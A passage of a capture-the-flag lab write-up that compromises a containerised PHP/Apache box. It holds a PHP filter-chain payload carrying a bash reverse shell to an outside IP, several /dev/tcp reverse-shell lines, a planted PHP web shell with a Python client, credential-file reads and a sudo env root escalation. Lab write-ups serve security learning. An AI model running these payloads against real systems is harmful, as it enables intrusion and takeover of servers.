rt.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp/dog&ext=&c=bash+-i+>+/dev/tcp/10.8.3.163/8888+2>%261+
```
Didnt work, lets try again:
```bash
/bin/bash -c "/bin/bash -i >/dev/tcp/10.8.3.163/8888 2>&1"&
/bin/bash -c "/bin/bash -i 2>&1 >/dev/tcp/10.8.3.163/8888 "&
/bin/bash -c "/bin/bash -i 2>&1 >/dev/tcp/10.8.3.163/8888 &"
bash -i 2>&1 >/dev/tcp/10.8.3.163/8888
bash -i >/dev/tcp/10.8.3.163/8888
```
None of those worked so lets just upload a webshell.
```bash
echo "<?php echo system($_POST['cmd'])" > ./.cat1.php
```
Lets url encode it
```bash
echo+"<%3fphp+echo+system($_POST['cmd'])"+>+./.cat1.php
```
Now lets check if it worked
Worked, but I forget to put the closer tag:
```bash
echo+"<%3fphp+echo+system($_POST['cmd']); ?>"+>+./.cat1.php
```
I see that there is no `$_POST` because `$_` has bash meaning lets see how we can escape it
# Webshell Upload command
```bash
echo+"<%3fphp+echo+system(\$_POST['cmd']);+?>"+>+./.cat1.php
```
![[Pasted image 20241220115915.png]]
Finally it worked, we have a webshell
lets create a tiny python client side to it:
```python
import requests
WEBSHELL_URL = 'http://10.10.94.163/.cat1.php'
def exec(command: str):
	print(requests.post(WEBSHELL_URL, {'cmd':command}).text)
```

Now I can simply run command like this:

```python
exec('ls -lat /etc')
exec('ls -lat /var/log/apache2')
exec('cat /var/log/apache2/access.log')
exec('cat /var/log/apache2/error.log')
```

```
/etc
-rw-r--r-- 1 root root      13 Dec 20 13:30 hostname
-rw-r--r-- 1 root root     174 Dec 20 13:30 hosts
-rw-r--r-- 1 root root     619 Dec 20 13:30 resolv.conf
drwxr-xr-x 1 root root    4096 Dec 20 13:30 ..
drwxr-xr-x 1 root root    4096 Dec 20 13:30 .
lrwxrwxrwx 1 root root      12 Dec 20 13:30 mtab -> /proc/mounts
-r--r----- 1 root root     707 Mar 10  2020 sudoers
drwxr-xr-x 1 root root    4096 Mar 10  2020 init.d
drwxr-xr-x 1 root root    4096 Mar 10  2020 pam.d
drwxr-xr-x 1 root root    4096 Mar 10  2020 rc2.d
drwxr-xr-x 1 root root    4096 Mar 10  2020 rc3.d
drwxr-xr-x 1 root root    4096 Mar 10  2020 rc4.d
drwxr-xr-x 1 root root    4096 Mar 10  2020 rc5.d
drwxr-xr-x 2 root root    4096 Mar 10  2020 sudoers.d
drwxr-xr-x 1 root root    4096 Feb 26  2020 cron.daily
drwxr-xr-x 1 root root    4096 Feb 26  2020 default
drwxr-xr-x 1 root root    4096 Feb 26  2020 alternatives
-rw-r--r-- 1 root root   14704 Feb 26  2020 ld.so.cache
-rw-r--r-- 1 root root    1604 Feb 26  2020 mailcap
drwxr-xr-x 1 root root    4096 Feb 26  2020 apache2
drwxr-xr-x 1 root root    4096 Feb 26  2020 rc0.d
drwxr-xr-x 1 root root    4096 Feb 26  2020 rc1.d
drwxr-xr-x 1 root root    4096 Feb 26  2020 rc6.d
drwxr-xr-x 1 root root    4096 Feb 26  2020 logrotate.d
drwxr-xr-x 1 root root    4096 Feb 26  2020 rcS.d
drwxr-xr-x 2 root root    4096 Feb 26  2020 sysctl.d
drwxr-xr-x 1 root root    4096 Feb 26  2020 dpkg
-rw-r--r-- 1 root root    5713 Feb 26  2020 ca-certificates.conf
drwxr-xr-x 4 root root    4096 Feb 26  2020 ssl
drwxr-xr-x 2 root root    4096 Feb 26  2020 ldap
drwxr-xr-x 3 root root    4096 Feb 26  2020 gss
drwxr-xr-x 3 root root    4096 Feb 26  2020 ca-certificates
drwxr-xr-x 3 root root    4096 Feb 26  2020 emacs
drwxr-xr-x 4 root root    4096 Feb 26  2020 perl
-rw------- 1 root root       0 Feb 24  2020 .pwd.lock
-rw-r--r-- 1 root root    2981 Feb 24  2020 adduser.conf
drwxr-xr-x 1 root root    4096 Feb 24  2020 apt
-rw-r--r-- 1 root root       0 Feb 24  2020 environment
-rw-r--r-- 1 root root      37 Feb 24  2020 fstab
-rw-r--r-- 1 root root     446 Feb 24  2020 group
-rw-r--r-- 1 root root     446 Feb 24  2020 group-
-rw-r----- 1 root shadow   374 Feb 24  2020 gshadow
drwxr-xr-x 2 root root    4096 Feb 24  2020 ld.so.conf.d
lrwxrwxrwx 1 root root      27 Feb 24  2020 localtime -> /usr/share/zoneinfo/Etc/UTC
-rw-r--r-- 1 root root      33 Feb 24  2020 machine-id
drwxr-xr-x 2 root root    4096 Feb 24  2020 opt
-rw-r--r-- 1 root root     926 Feb 24  2020 passwd
-rw-r--r-- 1 root root     926 Feb 24  2020 passwd-
drwxr-xr-x 4 root root    4096 Feb 24  2020 security
drwxr-xr-x 2 root root    4096 Feb 24  2020 selinux
-rw-r----- 1 root shadow   501 Feb 24  2020 shadow
-rw-r----- 1 root shadow   501 Feb 24  2020 shadow-
-rw-r--r-- 1 root root      73 Feb 24  2020 shells
drwxr-xr-x 2 root root    4096 Feb 24  2020 skel
-rw-r--r-- 1 root root       0 Feb 24  2020 subgid
-rw-r--r-- 1 root root       0 Feb 24  2020 subuid
drwxr-xr-x 2 root root    4096 Feb 24  2020 terminfo
-rw-r--r-- 1 root root       8 Feb 24  2020 timezone
drwxr-xr-x 2 root root    4096 Feb 24  2020 update-motd.d
-rw-r--r-- 1 root root      27 Feb  1  2020 issue
-rw-r--r-- 1 root root      20 Feb  1  2020 issue.net
-rw-r--r-- 1 root root     286 Feb  1  2020 motd
lrwxrwxrwx 1 root root      21 Feb  1  2020 os-release -> ../usr/lib/os-release
drwxr-xr-x 2 root root    4096 Feb  1  2020 profile.d
-rw-r--r-- 1 root root       5 Feb  1  2020 debian_version
-rw-r--r-- 1 root root     812 Jan 10  2020 mke2fs.conf
-rw-r--r-- 1 root root     111 Oct 22  2019 magic
-rw-r--r-- 1 root root     111 Oct 22  2019 magic.mime
drwxr-xr-x 3 root root    4096 May 28  2019 kernel
-rw-r--r-- 1 root root     191 Apr 25  2019 libaudit.conf
lrwxrwxrwx 1 root root      13 Apr 23  2019 rmt -> /usr/sbin/rmt
-rw-r--r-- 1 root root    1994 Apr 18  2019 bash.bashrc
-rw-r--r-- 1 root root     642 Mar  1  2019 xattr.conf
-rw-r--r-- 1 root root    2969 Feb 26  2019 debconf.conf
-rw-r--r-- 1 root root     552 Feb 14  2019 pam.conf
-rw-r--r-- 1 root root     494 Feb 10  2019 nsswitch.conf
-rw-r--r-- 1 root root     449 Feb  9  2019 mailcap.order
-rw-r--r-- 1 root root   24512 Feb  9  2019 mime.types
drwxr-xr-x 1 root root    4096 Dec  3  2018 systemd
-rw-r--r-- 1 root root    2584 Aug  1  2018 gai.conf
-rw-r--r-- 1 root root   10477 Jul 27  2018 login.defs
-rw-r--r-- 1 root root    4141 Jul 27  2018 securetty
-rw-r--r-- 1 root root    2351 May 31  2018 sysctl.conf
-rw-r--r-- 1 root root     367 Mar  2  2018 bindresvport.blacklist
-rw-r--r-- 1 root root      34 Mar  2  2018 ld.so.conf
-rw-r--r-- 1 root root     604 Jun 26  2016 deluser.conf
-rw-r--r-- 1 root root     767 Mar  4  2016 profile
-rw-r--r-- 1 root root       9 Aug  7  2006 host.conf
```

```
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
we can see that the OS is different - debian VS ubuntu(according to the SSH banner)
which means we have a container running.


```python
python php_filter_chain_generator.py --chain '<?php echo system("ls /etc/apache2")?>'
```

```
apache2.conf
conf-available
conf-enabled
envvars
magic
mods-available
mods-enabled
ports.conf
sites-available
sites-enabled
sites-enabledÉ
```


```
apache.conf
# This is the main Apache server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See http://httpd.apache.org/docs/2.4/ for detailed information about
# the directives and /usr/share/doc/apache2/README.Debian about Debian specific
# hints.
#
#
# Summary of how the Apache 2 configuration works in Debian:
# The Apache 2 web server configuration in Debian is quite different to
# upstream's suggested way to configure the web server. This is because Debian's
# default Apache2 installation attempts to make adding and removing modules,
# virtual hosts, and extra configuration directives as flexible as possible, in
# order to make automating the changes and administering the server as easy as
# possible.

# It is split into several files forming the configuration hierarchy outlined
# below, all located in the /etc/apache2/ directory:
#
#	/etc/apache2/
#	|-- apache2.conf
#	|	`--  ports.conf
#	|-- mods-enabled
#	|	|-- *.load
#	|	`-- *.conf
#	|-- conf-enabled
#	|	`-- *.conf
# 	`-- sites-enabled
#	 	`-- *.conf
#
#
# * apache2.conf is the main configuration file (this file). It puts the pieces
#   together by including all remaining configuration files when starting up the
#   web server.
#
# * ports.conf is always included from the main configuration file. It is
#   supposed to determine listening ports for incoming connections which can be
#   customized anytime.
#
# * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
#   directories contain particular configuration snippets which manage modules,
#   global configuration fragments, or virtual host configurations,
#   respectively.
#
#   They are activated by symlinking available configuration files from their
#   respective *-available/ counterparts. These should be managed by using our
#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
#   their respective man pages for detailed information.
#
# * The binary is called apache2. Due to the use of environment variables, in
#   the default configuration, apache2 needs to be started/stopped with
#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
#   work with the default configuration.


# Global configuration
#

#
# ServerRoot: The top of the directory tree under which the server's
# configuration, error, and log files are kept.
#
# NOTE!  If you intend to place this on an NFS (or otherwise network)
# mounted filesystem then please read the Mutex documentation (available
# at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
# you will save yourself a lot of trouble.
#
# Do NOT add a slash at the end of the directory path.
#
#ServerRoot "/etc/apache2"

#
# The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
#
#Mutex file:${APACHE_LOCK_DIR} default

#
# The directory where shm and other runtime files will be stored.
#

DefaultRuntimeDir ${APACHE_RUN_DIR}

#
# PidFile: The file in which the server should record its process
# identification number when it starts.
# This needs to be set in /etc/apache2/envvars
#
PidFile ${APACHE_PID_FILE}

#
# Timeout: The number of seconds before receives and sends time out.
#
Timeout 300

#
# KeepAlive: Whether or not to allow persistent connections (more than
# one request per connection). Set to "Off" to deactivate.
#
KeepAlive On

#
# MaxKeepAliveRequests: The maximum number of requests to allow
# during a persistent connection. Set to 0 to allow an unlimited amount.
# We recommend you leave this number high, for maximum performance.
#
MaxKeepAliveRequests 100

#
# KeepAliveTimeout: Number of seconds to wait for the next request from the
# same client on the same connection.
#
KeepAliveTimeout 5


# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}

#
# HostnameLookups: Log the names of clients or just their IP addresses
# e.g., www.apache.org (on) or 204.62.129.132 (off).
# The default is off because it'd be overall better for the net if people
# had to knowingly turn this feature on, since enabling it means that
# each client request will result in AT LEAST one lookup request to the
# nameserver.
#
HostnameLookups Off

# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog ${APACHE_LOG_DIR}/error.log

#
# LogLevel: Control the severity of messages logged to the error_log.
# Available values: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the log level for particular modules, e.g.
# "LogLevel info ssl:warn"
#
LogLevel warn

# Include module configuration:
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# Include list of ports to listen on
Include ports.conf


# Sets the default security model of the Apache2 HTTPD server. It does
# not allow access to the root filesystem outside of /usr/share and /var/www.
# The former is used by web applications packaged in Debian,
# the latter may be used for local directories served by the web server. If
# your system is serving content from a sub-directory in /srv you must allow
# access here, or in any related virtual host.
<Directory />
	Options FollowSymLinks
	AllowOverride None
	Require all denied
</Directory>

<Directory /usr/share>
	AllowOverride None
	Require all granted
</Directory>

<Directory /var/www/>
	Options Indexes FollowSymLinks
	AllowOverride None
	Require all granted
</Directory>

#<Directory /srv/>
#	Options Indexes FollowSymLinks
#	AllowOverride None
#	Require all granted
#</Directory>




# AccessFileName: The name of the file to look for in each directory
# for additional configuration directives.  See also the AllowOverride
# directive.
#
AccessFileName .htaccess

#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
	Require all denied
</FilesMatch>


#
# The following directives define some format nicknames for use with
# a CustomLog directive.
#
# These deviate from the Common Log Format definitions in that they use %O
# (the actual bytes sent including headers) instead of %b (the size of the
# requested file), because the latter makes it impossible to detect partial
# requests.
#
# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
# Use mod_remoteip instead.
#
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent

# Include of directories ignores editors' and dpkg's backup files,
# see README.Debian for details.

# Include generic snippets of statements
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

```

ports.conf
# If you just change the port or add more ports here, you will likely also
# have to change the VirtualHost statement in
# /etc/apache2/sites-enabled/000-default.conf

Listen 80

<IfModule ssl_module>
	Listen 443
</IfModule>

<IfModule mod_gnutls.c>
	Listen 443
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```


```
envvars
# envvars - default environment variables for apache2ctl

# this won't be correct after changing uid
unset HOME

# for supporting multiple apache2 instances
if [ "${APACHE_CONFDIR##/etc/apache2-}" != "${APACHE_CONFDIR}" ] ; then
	SUFFIX="-${APACHE_CONFDIR##/etc/apache2-}"
else
	SUFFIX=
fi

# Since there is no sane way to get the parsed apache2 config in scripts, some
# settings are defined via environment variables and then used in apache2ctl,
# /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.
: ${APACHE_RUN_USER:=www-data}
export APACHE_RUN_USER
: ${APACHE_RUN_GROUP:=www-data}
export APACHE_RUN_GROUP
# temporary state file location. This might be changed to /run in Wheezy+1
: ${APACHE_PID_FILE:=/var/run/apache2$SUFFIX/apache2.pid}
export APACHE_PID_FILE
: ${APACHE_RUN_DIR:=/var/run/apache2$SUFFIX}
export APACHE_RUN_DIR
: ${APACHE_LOCK_DIR:=/var/lock/apache2$SUFFIX}
export APACHE_LOCK_DIR
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
: ${APACHE_LOG_DIR:=/var/log/apache2$SUFFIX}
export APACHE_LOG_DIR

## The locale used by some modules like mod_dav
: ${LANG:=C}
export LANG
## Uncomment the following line to use the system default locale instead:
#. /etc/default/locale

export LANG

## The command to get the status for 'apache2ctl status'.
## Some packages providing 'www-browser' need '--dump' instead of '-dump'.
#export APACHE_LYNX='www-browser -dump'

## If you need a higher file descriptor limit, uncomment and adjust the
## following line (default is 8192):
#APACHE_ULIMIT_MAX_FILES='ulimit -n 65536'

## If you would like to pass arguments to the web server, add them below
## to the APACHE_ARGUMENTS environment.
#export APACHE_ARGUMENTS=''

## Enable the debug mode for maintainer scripts.
## This will produce a verbose output on package installations of web server modules and web application
## installations which interact with Apache
#export APACHE2_MAINTSCRIPT_DEBUG=1
```

```python
exec('find / -name *.txt 2>/dev/null')
```
```
/var/www/flag2_QMW7JvaY2LvK.txt
/usr/local/lib/php/.channels/.alias/pecl.txt
/usr/local/lib/php/.channels/.alias/phpdocs.txt
/usr/local/lib/php/.channels/.alias/pear.txt
/usr/local/lib/php/doc/Archive_Tar/docs/Archive_Tar.txt
/usr/share/perl/5.28.1/unicore/Blocks.txt
/usr/share/perl/5.28.1/unicore/NamedSequences.txt
/usr/share/perl/5.28.1/unicore/SpecialCasing.txt
/usr/share/perl/5.28.1/Unicode/Collate/allkeys.txt
/usr/share/perl/5.28.1/Unicode/Collate/keys.txt
/usr/share/perl/5.28.1/Unicode/Collate/keys.txt
```

```python
exec('find / -name *pass* 2>/dev/null')

```
```
/etc/passwd
/etc/passwd-
/etc/cron.daily/passwd
/etc/pam.d/chpasswd
/etc/pam.d/passwd
/etc/pam.d/common-password
/etc/security/opasswd
/etc/apache2/mods-available/proxy_fdpass.load
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/proc/sys/net/bridge/bridge-nf-pass-vlan-input-dev
/var/cache/debconf/passwords.dat
/var/lib/dpkg/info/base-passwd.postrm
/var/lib/dpkg/info/base-passwd.md5sums
/var/lib/dpkg/info/passwd.conffiles
/var/lib/dpkg/info/passwd.md5sums
/var/lib/dpkg/info/base-passwd.templates
/var/lib/dpkg/info/base-passwd.preinst
/var/lib/dpkg/info/passwd.list
/var/lib/dpkg/info/passwd.preinst
/var/lib/dpkg/info/base-passwd.postinst
/var/lib/dpkg/info/base-passwd.list
/var/lib/dpkg/info/passwd.postinst
/var/lib/pam/password
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/htpasswd
/usr/local/include/php/ext/mbstring/libmbfl/mbfl/mbfilter_pass.h
/usr/local/include/php/ext/standard/php_password.h
/usr/lib/tmpfiles.d/passwd.conf
/usr/lib/apache2/modules/mod_proxy_fdpass.so
/usr/include/rpcsvc/yppasswd.x
/usr/include/rpcsvc/yppasswd.h
/usr/share/doc/passwd
/usr/share/doc/base-passwd
/usr/share/base-passwd
/usr/share/base-passwd/passwd.master
/usr/share/pam/common-password.md5sums
/usr/share/pam/common-password
/usr/share/apache2/ask-for-passphrase
/usr/share/ca-certificates/mozilla/Buypass_Class_2_Root_CA.crt
/usr/share/ca-certificates/mozilla/Buypass_Class_3_Root_CA.crt
/usr/sbin/chpasswd
/usr/sbin/chgpasswd
/usr/sbin/update-passwd
/sys/devices/system/cpu/vulnerabilities/spec_store_bypass
/sys/module/libata/parameters/atapi_passthru16
/sys/module/libata/parameters/atapi_passthru16
```


```python
exec('env')
```
```
PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi
APACHE_CONFDIR=/etc/apache2
HOSTNAME=987b12b4dbdf
PHP_INI_DIR=/usr/local/etc/php
SHLVL=0
PHP_EXTRA_BUILD_DEPS=apache2-dev
PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_MD5=
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=7.4.3
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
PHP_ASC_URL=https://www.php.net/get/php-7.4.3.tar.xz.asc/from/this/mirror
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/get/php-7.4.3.tar.xz/from/this/mirror
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
PHP_SHA256=cf1f856d877c268124ded1ede40c9fb6142b125fdaafdc54f855120b8bc6982a
APACHE_ENVVARS=/etc/apache2/envvars
APACHE_ENVVARS=/etc/apache2/envvars
```

After a bit of searching I found the script /opt/backups/backup.sh
which does the following:
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
tar cf /root/container/backup/backup.tar /root/container
```

Found out that the most classic sudo -l is relevant here
```
Matching Defaults entries for www-data on 987b12b4dbdf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 987b12b4dbdf:
    (root) NOPASSWD: /usr/bin/env
    (root) NOPASSWD: /usr/bin/env
```

Running of course `sudo /usr/bin/env`
and I get:
```
HOSTNAME=987b12b4dbdf
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C
MAIL=/var/mail/root
LOGNAME=root
USER=root
HOME=/root
SHELL=/bin/bash
TERM=unknown
SUDO_COMMAND=/usr/bin/env
SUDO_USER=www-data
SUDO_UID=33
SUDO_GID=33
SUDO_GID=33
```
Lets open the manual of env
and see this awesome feature:

![[Pasted image 20241220122710.png]]
Can we run code as root?
```python
exec('sudo /usr/bin/env id')
```
![[Pasted image 20241220122806.png]]
Woohooooooooooo
Great Success!
lets get the third flag!
```python
exec('sudo /usr/bin/env cat /root/flag3.txt')
```

# ==Flag 3==

```
THM{D1ff3r3nt_3nv1ronments_874112}
```


# Flag 4 
Now I run as root on the container.
lets upgrade our client side:
```python
import requests
WEBSHELL_URL = 'http://10.10.94.163/.cat1.php'
SUDO_BINARY_COMMAND = 'sudo /usr/bin/env '
def exec(command: str):
	print(requests.post(WEBSHELL_URL, {'cmd': SUDO_BINARY_COMMAND + command}).text)
```
I guess that the flag 4 exists outside of the container, I know that there is an SSH service running on the host, so maybe I can find creds or an SSH key.
```python
exec('find / -name *key* 2>/dev/null')
exec('find / -name *ssh* 2>/dev/null')
exec('find / -name *password* 2>/dev/null')
exec('find / -name *root* 2>/dev/null')
exec('find / -name *.txt 2>/dev/null')
```

I ran 
```python
exec('cat /etc/shadow') # no pass for root
exec('cat /etc/gshadow')
exec('cat /etc/passwd')
exec('ls -lat /etc') # went over apache2 conf files, ssl, ldap, perl, init.d
exec('cat /etc/mailcap')
exec('cat /etc/pam.conf')
exec('cat /etc/host.conf')
exec('cat /etc/gai.conf')
exec('cat /etc/libaudit.conf')
exec('cat /etc/mtab')
exec('cat /etc/resolv.conf')

```

Found from this the file /etc/ssl/certs/Comodo_AAA_Services_root.pem:
```
-BEGIN CERTIFICATE-----
MIIEMjCCAxqgAwIBAgIBATANBgkqhkiG9w0BAQUFADB7MQswCQYDVQQGEwJHQjEb
MBkGA1UECAwSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHDAdTYWxmb3JkMRow
GAYDVQQKDBFDb21vZG8gQ0EgTGltaXRlZDEhMB8GA1UEAwwYQUFBIENlcnRpZmlj
YXRlIFNlcnZpY2VzMB4XDTA0MDEwMTAwMDAwMFoXDTI4MTIzMTIzNTk1OVowezEL
MAkGA1UEBhMCR0IxGzAZBgNVBAgMEkdyZWF0ZXIgTWFuY2hlc3RlcjEQMA4GA1UE
BwwHU2FsZm9yZDEaMBgGA1UECgwRQ29tb2RvIENBIExpbWl0ZWQxITAfBgNVBAMM
GEFBQSBDZXJ0aWZpY2F0ZSBTZXJ2aWNlczCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAL5AnfRu4ep2hxxNRUSOvkbIgwadwSr+GB+O5AL686tdUIoWMQua
BtDFcCLNSS1UY8y2bmhGC1Pqy0wkwLxyTurxFa70VJoSCsN6sjNg4tqJVfMiWPPe
3M/vg4aijJRPn2jymJBGhCfHdr/jzDUsi14HZGWCwEiwqJH5YZ92IFCokcdmtet4
YgNW8IoaE+oxox6gmf049vYnMlhvB/VruPsUK6+3qszWY19zjNoFmag4qMsXeDZR
rOme9Hg6jc8P2ULimAyrL58OAd7vn5lJ8S3frHRNG5i1R8XlKdH5kBjHYpy+g8cm
ez6KJcfA3Z3mNWgQIJ2P2N7Sw4ScDV7oL8kCAwEAAaOBwDCBvTAdBgNVHQ4EFgQU
oBEKIz6W8Qfs4q8p74Klf9AwpLQwDgYDVR0PAQH/BAQDAgEGMA8GA1UdEwEB/wQF
MAMBAf8wewYDVR0fBHQwcjA4oDagNIYyaHR0cDovL2NybC5jb21vZG9jYS5jb20v
QUFBQ2VydGlmaWNhdGVTZXJ2aWNlcy5jcmwwNqA0oDKGMGh0dHA6Ly9jcmwuY29t
b2RvLm5ldC9BQUFDZXJ0aWZpY2F0ZVNlcnZpY2VzLmNybDANBgkqhkiG9w0BAQUF
AAOCAQEACFb8AvCb6P+k+tZ7xkSAzk/ExfYAWMymtrwUSWgEdujm7l3sAg9g1o1Q
GE8mTgHj5rCl7r+8dFRBv/38ErjHT1r0iWAFf2C3BUrz9vHCv8S5dIa2LX1rzNLz
Rt0vxuBqw8M0Ayx9lt1awg6nCpnBBYurDC/zXDrPbDdVCYfeU0BsWO/8tqtlbgT2
G9w84FoVxp7Z8VlIMCFlA2zs6SFz7JsDoeA3raAVGI/6ugLOpyypEBMs1OUIJqsi
l2D4kF501KKaU73yqWjgom7C12yxow+ev+to51byrvLjKzg6CYG1a4XXvi3tPxq3
smPi9WIsgtRqAEFQ8TmDn5XpNpaYbg==
-----END CERTIFICATE-----
```

Also there are the binaries pivot_root and switch_root, which allow the user to mount the container filesystem from another mount point, practically making a new root directory.
But its chances to work are lower than the dead sea.
I try to enumerate as much as I can to find any misconfiguration that can enable me to escape the contained environment:
1. Creds
2. Connections
3. processes
4. services
5. Configuration files

I missed a few interesting suffixes, lets enumerate them now:
```python
exec('find / -name *user* 2>/dev/null') # Many files, mostly kernelic, not helpful
exec('find / -name *.yml 2>/dev/null') # /usr/share/perl/5.28.1/CPAN/Kwalify/distroprefs.yml - wasnt helpful
exec('find / -name *.conf 2>/dev/null')
exec('find / -name *.cfg 2>/dev/null')
exec('find / -name *.ini 2>/dev/null')
exec('find / -name *.db 2>/dev/null')# Not exist
exec('find / -name *.sql 2>/dev/null')# Not exist
exec('find / -name *.docker* 2>/dev/null')# one file ,not interesting
exec('find / -name *.sh 2>/dev/null')
exec('find / -name *.log 2>/dev/null')
exec('ps auxfwwwe') # Shows full command line
exec('ls -lat /root/.bash_history')
exec('find / -name *history*') # /var/log/apt/history.log -> Not interesting
exec('find / -name *.gpg*') # /var/log/apt/history.log -> Not interesting
```

Interesting info from the ps:

```
PHP_VERSION=7.4.3
PHP_INI_DIR=/usr/local/etc/php 
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
APACHE_ENVVARS=/etc/apache2/envvars
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
```

```
drwxr-xr-x 1 root root  4096 Feb 26  2020 conf.d
drwxr-xr-x 1 root root  4096 Feb 26  2020 .
-rw-r--r-- 1 root root 72219 Feb 26  2020 php.ini-development
-rw-r--r-- 1 root root 72523 Feb 26  2020 php.ini-production
drwxr-xr-x 1 root root  4096 Feb 26  2020 ..
drwxr-xr-x 1 root root  4096 Feb 26  2020 ..

```
Didnt find anything useful...
```python
exec('iptables -nvL')
```
I found in the /opt/backups folder a backup.tar file,
so I extracted it using the following command:
```python
exec('tar xvf /opt/backups/backup.tar')
```


```bash
/var/www/html/root/container/launch.sh
#!/bin/bash
docker run -d -p 80:80 -v /root/container/backup:/opt/backups --rm box
docker run -d -p 80:80 -v /root/container/backup:/opt/backups --rm box
```

```
Dockerfile
FROM php:apache-buster

# Setup document root
RUN mkdir -p /var/www/html

# Make the document root a volume
VOLUME /var/www/html

# Add application
WORKDIR /var/www/html
COPY --chown=www-data src/ /var/www/html/

RUN rm /var/log/apache2/*.log

